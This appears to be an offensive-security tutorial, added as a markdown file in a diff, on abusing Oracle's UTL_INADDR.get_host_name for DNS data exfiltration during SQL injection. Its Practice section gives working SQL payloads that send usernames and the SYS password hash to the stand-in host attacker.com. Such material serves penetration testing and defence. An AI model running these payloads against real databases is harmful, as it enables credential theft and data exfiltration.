@@ -1,0 +1,65 @@
+---
+title: Exploiting Oracle's UTL_INADDR for DNS Data Exfiltration
+description: Learn how to exploit Oracle's UTL_INADDR for out-of-band data exfiltration
+  using DNS.
+keywords:
+- UTL_INADDR
+- DNS exfiltration
+- Oracle SQL injection
+- network security
+- Oracle database functions
+---
+
+# UTL_INADDR
+
+## Context
+
+The objective of this article is to demonstrate the exploitation of Oracle's UTL_INADDR package for out-of-band data exfiltration using DNS. The reader should have familiarity with DNS protocols, Oracle database functions, and Oracle SQL injection techniques to effectively utilize this knowledge in a controlled environment.
+
+## Theory
+
+### UTL_INADDR Functionality
+
+UTL_INADDR is an Oracle package designed to perform network-related operations, particularly DNS resolutions. While its primary purpose is to facilitate network communication within database applications, this functionality can be exploited maliciously. The package allows DNS resolution using SQL queries, which attackers can leverage to exfiltrate data. When input validation is insufficient, UTL_INADDR can be utilized to submit arbitrary DNS queries. 
+
+### DNS Exfiltration via UTL_INADDR
+
+DNS exfiltration involves the extraction of data from a target system by injecting data into DNS queries that are resolved by an attacker's DNS server. The typical sequence involves crafting SQL injections that prompt the database to perform DNS lookups with embedded data. This data flows from the Oracle database server to the attacker's DNS server and can bypass traditional firewall restrictions since DNS traffic is seldom blocked. 
+
+### Host Resolution and Data Exfiltration
+
+Host resolution is the process of converting domain names into IP addresses. UTL_INADDR provides functions such as `get_host_name` for this purpose. Attackers can exploit this facility by resolving domains they control with additional information appended as subdomains. By sending queries with embedded sensitive information, attackers can extract data, effectively using DNS's design to bypass network security controls that fail to inspect payloads within DNS resolutions.
+
+## Practice
+
+### Exfiltrate Data Using UTL_INADDR.get_host_name
+
+Below are steps to exfiltrate data using SQL commands and the `get_host_name` function:
+
+1. **Testing Connectivity**
+   - Start by confirming that UTL_INADDR can resolve external hostnames, establishing network capability. Use the following SQL command:
+   ```bash
+   SELECT UTL_INADDR.get_host_name('attacker.com') FROM dual;
+   ```
+   This query will trigger a DNS request to `attacker.com`, verifying that the Oracle server can perform DNS lookups.
+
+2. **Exfiltrating Usernames**
+   - Perform a more sophisticated query to extract usernames from the database:
+   ```bash
+   SELECT UTL_INADDR.get_host_name((SELECT username FROM all_users)||'.attacker.com') FROM dual;
+   ```
+   Here, usernames are appended as subdomains to `attacker.com`, encoded in DNS requests reaching the attacker's DNS server.
+
+3. **Exfiltrating SYS Password Hash**
+   - Further exploit the functionality to exfiltrate critical data like password hashes:
+   ```bash
+   SELECT UTL_INADDR.get_host_name((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com') FROM dual;
+   ```
+   This query sends the SYS user's password hash to an external DNS server controlled by the attacker, enabling them to capture and potentially crack the password offline.
+
+**Outcome:** By executing these commands, sensitive data is exfiltrated from the Oracle database to designated DNS servers controlled by the attacker, circumventing typical network and security barriers.
+
+## Tools
+
+- **Oracle SQL*Plus**
+- **Wireshark**
